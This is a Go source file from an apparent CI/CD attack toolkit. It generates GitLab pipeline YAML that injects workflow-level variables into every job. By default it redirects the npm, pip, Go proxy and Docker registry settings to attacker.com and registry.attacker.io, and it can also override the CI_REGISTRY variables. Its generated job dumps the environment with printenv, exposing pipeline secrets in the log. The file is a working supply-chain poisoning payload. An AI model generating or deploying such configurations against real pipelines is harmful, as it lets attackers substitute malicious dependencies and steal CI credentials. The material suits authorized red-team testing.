package payloads

import (
	"fmt"
	"sort"
	"strings"
)

// WorkflowRulesVarsOptions configures a workflow:rules:variables injection payload.
type WorkflowRulesVarsOptions struct {
	Common     CommonOptions
	Variables  map[string]string // variables to inject at workflow level
	TriggerOn  string            // pipeline_source condition (default: "merge_request_event")
	OverrideCI bool              // override CI_* variables (aggressive mode)
}

// GenerateWorkflowRulesVarsYAML generates a CI config that uses workflow-level
// rules:variables to inject variables that affect ALL downstream jobs.
func GenerateWorkflowRulesVarsYAML(o WorkflowRulesVarsOptions) string {
	name, stage := o.Common.defaults("exploit")
	if o.TriggerOn == "" {
		o.TriggerOn = "merge_request_event"
	}
	if len(o.Variables) == 0 {
		o.Variables = defaultWorkflowVars(o.OverrideCI)
	}

	varsBlock := buildWorkflowVarsBlock(o.Variables)

	return fmt.Sprintf(`workflow:
  rules:
    - if: '$CI_PIPELINE_SOURCE == "%s"'
      variables:
%s
    - when: always

stages: [%s]

%s:
  stage: %s%s%s
  script:
    - echo "Workflow-level variables injected — affect ALL jobs"
    - printenv | sort || true
  allow_failure: true%s
`, o.TriggerOn,
		indentBlock(strings.TrimSpace(varsBlock), 8),
		stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		rulesManual(o.Common.Manual))
}

func defaultWorkflowVars(overrideCI bool) map[string]string {
	vars := map[string]string{
		"NPM_CONFIG_REGISTRY": "https://attacker.com/npm",
		"PIP_INDEX_URL":       "https://attacker.com/pypi/simple",
		"GOPROXY":             "https://attacker.com/goproxy,direct",
		"DOCKER_AUTH_CONFIG":  `{"auths":{"registry.attacker.io":{"auth":"dG9rZW4="}}}`,
		"GRADLE_OPTS":         "-Dorg.gradle.daemon=true",
	}
	if overrideCI {
		vars["CI_REGISTRY"] = "registry.attacker.io"
		vars["CI_REGISTRY_IMAGE"] = "registry.attacker.io/target"
	}
	return vars
}

func buildWorkflowVarsBlock(vars map[string]string) string {
	var b strings.Builder
	keys := make([]string, 0, len(vars))
	for k := range vars {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	for _, k := range keys {
		fmt.Fprintf(&b, "%s: %q\n", k, vars[k])
	}
	return b.String()
}
